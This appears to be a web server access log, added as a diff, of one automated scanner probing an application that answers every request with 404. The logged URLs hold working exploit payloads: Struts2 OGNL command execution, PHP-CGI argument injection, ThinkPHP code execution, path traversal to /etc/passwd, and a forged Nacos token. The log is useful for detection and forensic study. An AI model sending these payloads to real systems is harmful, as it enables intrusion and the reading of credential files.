+INFO:     9.135.100.135:59388 - "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59424 - "GET /mnt/ram/var/log/httpd.log%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59454 - "POST /client/api?command=samlSso HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59538 - "GET /solr/admin/info/properties%3A/admin/info/key HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59558 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59576 - "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59578 - "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59600 - "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59610 - "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59612 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59640 - "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59642 - "GET /users%3B. HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59712 - "POST /api/v0/train HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59772 - "POST /dataSetParam/verification%3Bswagger-ui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59830 - "GET /login?next=/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59920 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60010 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60056 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60120 - "GET /%40fs/C%3A/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60148 - "GET /%40fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60182 - "GET /%40fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60204 - "GET /%40fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60332 - "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60424 - "POST /api/v1/validate/code HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60444 - "GET /portalapi/v1/roles/option%3B/v1/ping HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60520 - "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60618 - "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60642 - "POST /api/jmeter/download/files HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60710 - "GET /camunda/app/welcome/default/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60718 - "GET /?query=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60810 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60830 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60884 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60896 - "GET /apisix/admin/migrate/export HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60984 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32776 - "GET /druid/submitLogin HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32834 - "GET /install.php?profile=default HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32840 - "GET /api/dev/metrics/relation HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32862 - "GET /core/install.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32910 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32934 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32932 - "POST /index.php?r=site/user-login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:32978 - "POST /hub/login?next HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33002 - "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33012 - "POST /hub/login?next HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33070 - "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33068 - "GET /sse?transportType=stdio&command=echo&args=IT_RiskScan HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33114 - "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33148 - "GET /api/version HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33154 - "POST /login/userverify.cgi HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33172 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33242 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33266 - "GET /naming/v1/services?limit=10&offset=0 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33328 - "GET /web/admin/setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33346 - "GET /login/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33412 - "GET /index.php?s=/index/index/name/$%7B@phpinfo()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33490 - "POST /?s=index/index/index HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33676 - "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33724 - "POST /index.php?s=captcha HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33934 - "GET /index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:33964 - "GET /api/cluster/global HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34046 - "GET /setup HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34068 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34096 - "GET /api/v1/namespaces/default/workflows?query HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34130 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:34156 - "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:37276 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:42820 - "GET /icons/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:45538 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:55296 - "OPTIONS / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:36784 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57114 - "GET http%3A//9.139.82.162/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57158 - "GET http%3A//10.99.229.178/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57178 - "GET http%3A//9.218.232.52/itscan.html HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57218 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57368 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:57576 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57648 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57706 - "GET /cgi-bin/gateway/agentinfo HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57706 - "POST /run HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57706 - "GET /api/session/properties HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     9.135.100.135:57706 - "GET /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57798 - "POST /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57794 - "POST /scripts/setup.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57800 - "POST /user.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57812 - "GET /index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57834 - "GET /login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57870 - "GET /index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57894 - "GET /index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57912 - "POST /?q=node&destination=node HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57916 - "GET /login.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57914 - "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat%20/etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57918 - "PUT /fileserver/339XMQeMXuD02hVk8u4TtI7B8gq.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57942 - "GET /index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57958 - "GET /fileserver/339XMQeMXuD02hVk8u4TtI7B8gq.txt HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:57966 - "GET /index.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58000 - "GET /login.action?redirectAction:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58024 - "GET /index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58044 - "POST /invoker/JMXInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58054 - "POST /?name=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27cat%20/etc/passwd%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58068 - "POST /invoker/EJBInvokerServlet/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58088 - "PUT /_users/org.couchdb.user%3Apoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58096 - "POST /invoker/readonly HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58158 - "POST /integration/saveGangster.action HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58174 - "GET /index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58204 - "GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58212 - "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58254 - "GET /?id=ybnXRJ%25{128*128} HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58294 - "GET /solr/admin/cores?wt=json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58306 - "POST /wls-wsat/CoordinatorPortType HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58308 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58316 - "POST /jars/upload HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58366 - "GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252ftmp%252fpoc HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58386 - "GET /?id=%25%7B%28%23instancemanager%3D%23application%5B%22org.apache.tomcat.InstanceManager%22%5D%29.%28%23stack%3D%23attr%5B%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5D%29.%28%23bean%3D%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3D%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3D%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3D%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2C%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2C%23emptyset%29%29.%28%23arglist%3D%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22cat+%2Fetc%2Fpasswd%22%29%29.%28%23execute%3D%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7D HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58394 - "GET /lua/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58404 - "GET /lua/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././find_prefs.lua.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58408 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58442 - "POST /minio/bootstrap/v1/verify HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58462 - "GET /public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58496 - "GET /public/plugins/alertlist/../../../../../conf/defaults.ini HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58508 - "GET /webui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58522 - "POST /v6.58/Products/Authentication HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58534 - "POST /services/messagebroker/streamingamf HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58576 - "GET /config HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58596 - "POST /component_server HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58598 - "POST /_async/AsyncResponseService HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58622 - "POST /app/rest/users/id%3A1/tokens/339XMWELJeMnhM1rQ8R0NFY4tGS%3B.jsp?jsp_precompile=true HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58640 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58704 - "GET /streampipes-backend/api/v2/auth/settings HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58730 - "GET /streampipes-backend/api/openapi.json HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58750 - "GET /tmp/temp.db%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58764 - "POST /webtools/control/main/ProgramExport HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58772 - "GET /mnt/ram/var/log/httpd.log%3F.1.1.1.1a-1.css HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58842 - "GET /api/data HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58864 - "POST /client/api?command=samlSso HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58874 - "GET /solr/admin/info/properties%3A/admin/info/key HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58936 - "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58952 - "POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58964 - "POST /index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:58966 - "GET /users HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59000 - "POST /drag/onlDragDatasetHead/getTotalData HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59004 - "POST /test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59010 - "GET /users%3B. HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59042 - "POST /test.hello?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59080 - "POST /api/v0/train HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59100 - "POST /dataSetParam/verification%3Bswagger-ui/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59124 - "GET /login?next=/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59196 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59236 - "POST / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59272 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59312 - "GET /%40fs/C%3A/windows/win.ini?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59332 - "GET /%40fs/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59344 - "GET /index.php?p=admin/actions/assets/generate-transform HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59360 - "GET /%40fs/../../../../../../../etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59368 - "POST /api/v1/validate/code HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59384 - "GET /%40fs/%252e%252e/%252e%252e/%252e%252e/etc/passwd?import&?inline=1.wasm?init HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59452 - "GET /portalapi/v1/roles/option%3B/v1/ping HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59464 - "GET /public/template.cgi?templatefile=$(id) HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59556 - "GET /locales/locale.json?locale=..%2F..%2Fconfig&namespace=app HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59560 - "GET /camunda/app/welcome/default/ HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59562 - "POST /api/jmeter/download/files HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59662 - "GET /?query=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59660 - "GET /query?db=db&q=SHOW%20DATABASES HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59664 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59778 - "POST /api/snapshots HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59790 - "GET /apisix/admin/migrate/export HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59798 - "GET /version HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59880 - "GET /druid/submitLogin HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59898 - "GET /install.php?profile=default HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59900 - "GET /api/dev/metrics/relation HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:59930 - "GET /core/install.php HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60032 - "GET / HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60042 - "POST /index.php?r=site/user-login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60066 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60076 - "POST /hub/login?next HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60094 - "POST /hub/login?next HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60178 - "GET /./../../../../../../../../../../etc/passwd HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60208 - "GET /sse?transportType=stdio&command=echo&args=IT_RiskScan HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60230 - "GET /nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60260 - "GET /v1/auth/users?pageNo=1&pageSize=10&accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g HTTP/1.1" 404 Not Found
+INFO:     9.135.100.135:60314 - "GET /api/version HTTP/1.1" 404 Not Found
